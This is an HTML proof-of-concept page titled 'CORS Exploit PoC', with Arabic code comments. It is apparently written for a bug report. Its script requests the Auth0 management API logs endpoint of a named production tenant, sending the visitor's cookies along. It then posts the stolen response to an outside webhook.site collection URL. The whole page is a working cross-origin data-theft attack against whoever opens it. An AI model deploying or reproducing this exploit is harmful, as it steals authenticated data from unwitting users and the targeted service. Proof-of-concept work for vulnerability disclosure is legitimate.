<!DOCTYPE html>
<html>
  <head>
    <title>CORS Exploit PoC</title>
  </head>
  <body>
    <h2>Loading...</h2>
    <script>
      fetch("https://production.maf.auth0.com/api/v2/logs", {
        method: "GET",
        credentials: "include" // ترسل الكوكي تلقائيًا
      })
      .then(response => response.text())
      .then(data => {
        // إرسال استجابة الـ API إلى Webhook الخاص بك
        fetch("https://webhook.site/7203edb4-d8d0-4c52-a515-49a63c90ed54", {
          method: "POST",
          headers: {
            "Content-Type": "text/plain"
          },
          body: data
        });
      })
      .catch(error => {
        console.error("Fetch error:", error);
      });
    </script>
  </body>
</html>
